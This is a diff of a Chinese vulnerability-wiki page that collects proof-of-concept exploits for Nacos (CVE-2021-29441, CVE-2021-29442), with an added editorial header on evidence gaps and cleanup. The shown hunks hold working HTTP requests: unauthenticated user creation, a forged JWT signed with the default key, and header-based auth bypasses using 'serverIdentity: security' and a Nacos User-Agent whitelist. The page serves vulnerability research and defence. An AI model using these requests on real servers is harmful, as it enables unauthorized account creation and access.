@@ -1,8 +1,55 @@
 ---
-cve: "CVE-2021-29441"
+cve: "CVE-2021-29441; CVE-2021-29442"
+title: "【Nacos】漏洞利用 Poc 整理"
+product: "Nacos Server/Client、Derby、JRaft/Hessian"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2021-29441; CVE-2021-29442; QVD-2023-6271; CNVD-2020-67618; CNVD-2023-45001"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "各节配置条件不同：Derby内置库、默认密钥未改、7848可达、控制配置且客户端易受Yaml反序列化等"
+source_url: "https://mp.weixin.qq.com/s/4REf1_gIOFju_LY_17Zj2w"
+source_status: "recorded"
+side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-7c0b82fae3c36f57c27f3e6a"
+entity_id: "ve-7c0b82fae3c36f57c27f3e6a"
+schema_version: "1"
 ---
 
 # 【Nacos】漏洞利用 Poc 整理
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：各节配置条件不同：Derby内置库、默认密钥未改、7848可达、控制配置且客户端易受Yaml反序列化等
+- 证据范围：全文含Java源/Python/base64 JAR原文已读，未解包或执行二进制；合集不可按单CVE29441命名
+
+### 本次正文校订
+
+- 按实际内容修正 4 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- JWT签名描述把base64与HMAC混淆，key字节/编码需精确说明
+- 登录拿JSESSIONID不是已证JWT鉴权成功，需后端API验证
+- 尾斜杠curl参数落入URL引号、XGET缺-、添加用户又无尾/
+- config.py缺失，server.py自己固定127.0.0.1与config变量不一致，远程无法按此取JAR
+- 脚本无限重试、无timeout/错误处理，可能反复修改Derby类路径
+- bcrypt是哈希验证/离线猜测非解密；hashcat --show只显示已有结果；末尾curl命令截断
+
+### 操作风险与资料使用
+
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4REf1_gIOFju_LY_17Zj2w)
@@ -25,7 +72,7 @@ cve: "CVE-2021-29441"
 
 添加用户：
 
-```
+```http
 POST /nacos/v1/auth/users HTTP/1.1
 
 username=test1&password=test1
@@ -45,7 +92,7 @@ JWT 设置 Header 为 HS256，payload 中 exp 为较大时间戳（比如当前�
 
 获得登录的 JSESSIONID：
 
-```
+```http
 POST /nacos/v1/auth/users/login HTTP/1.1
 Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMTM1NTEwMH0.zKH8OPXeQP6Eo7tMVPVb09Kb7RiI63ydLqUt57MOlsI
 
@@ -64,7 +111,7 @@ Nacos <= 2.2.0
 
 添加用户：
 
-```
+```http
 POST /nacos/v1/auth/users HTTP/1.1
 serverIdentity: security
 
@@ -79,7 +126,7 @@ Nacos <= 1.4.1
 
 产生原因，配置文件`nacos.core.auth.enable.userAgentAuthWhite=true`
 
-```
+```http
 GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken= HTTP/1.1
 User-Agent: Nacos-Serverver
 
